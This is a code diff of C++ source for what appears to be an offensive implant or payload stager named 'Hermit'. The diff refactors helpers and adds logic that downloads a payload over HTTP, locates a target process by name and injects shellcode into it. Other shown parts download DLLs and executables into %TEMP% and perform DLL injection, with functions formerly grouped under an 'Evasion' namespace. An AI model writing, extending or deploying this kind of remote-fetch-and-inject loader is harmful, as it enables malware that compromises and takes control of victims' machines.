@@ -50,7 +50,7 @@ namespace Hermit
         size_t dwDllPathSize = (dllPath.size() + 1) * sizeof(wchar_t);
 
         // Download a DLL file
-        bResults = System::Http::ReadResponseData(hRequest, dllPath);
+        bResults = System::Http::WriteResponseData(hRequest, dllPath);
         if (!bResults)
         {
             System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
@@ -64,7 +64,7 @@ namespace Hermit
         // Inject DLL
         if (strcmp(PAYLOAD_TECHNIQUE, "dll-injection") == 0)
         {
-            bResults = Evasion::Injection::DllInjection(dwPid, (LPVOID)dllPath.c_str(), dwDllPathSize);
+            bResults = Technique::Injection::DllInjection(dwPid, (LPVOID)dllPath.c_str(), dwDllPathSize);
         }
         else
         {
@@ -126,7 +126,7 @@ namespace Hermit
         std::wstring execPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + execFileName;
         
         // Download an executable
-        if (!System::Http::ReadResponseData(hRequest, execPath))
+        if (!System::Http::WriteResponseData(hRequest, execPath))
         {
             System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
             return FALSE;
@@ -193,10 +193,20 @@ namespace Hermit
 
         hRequest = resp.hRequest;
 
-        // Read & Execute a shellcode
+        std::vector<BYTE> respBytes = System::Http::ReadResponseBytes(hRequest);
+        if (respBytes.size() == 0)
+        {
+            return FALSE;
+        }
+
+        // Get target PID to inject DLL
+        DWORD dwPid = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS));
+
+        // Inject shellcode
         if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-injection") == 0)
         {
-            bResults = System::Http::ReadResponseShellcode(hRequest);
+            bResults = Technique::Injection::ShellcodeInjection(dwPid, respBytes);
+
         }
         else
         {
